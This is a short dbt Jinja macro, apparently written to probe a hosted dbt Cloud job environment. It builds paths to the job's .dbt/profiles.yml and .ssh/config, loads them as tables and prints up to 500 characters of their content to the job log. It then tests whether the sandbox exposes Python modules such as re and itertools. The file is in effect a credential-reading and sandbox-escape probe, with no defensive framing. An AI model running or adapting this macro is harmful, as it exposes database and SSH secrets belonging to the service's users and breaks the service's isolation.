{% macro file_read() %}
  {% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}
  
  {% set paths = [
    '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml',
    '/tmp/jobs/' ~ run_id ~ '/.ssh/config'
  ] %}
  
  {% for path in paths %}
    {{ log("TRYING_PATH=" ~ path, info=True) }}
    {% set tbl = load_agate_table(path) %}
    {{ log("TABLE_LOADED=" ~ (tbl | string)[:500], info=True) }}
  {% endfor %}
  
  {{ log("PROFILES_READ_ATTEMPT", info=True) }}
  {% set prof_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' %}
  {% set prof_content = modules.re.sub('', '', '') %}
  {{ log("RE_MODULE_WORKS", info=True) }}
  
  {% set itertools = modules.itertools %}
  {{ log("ITERTOOLS=" ~ (itertools | string), info=True) }}
{% endmacro %}
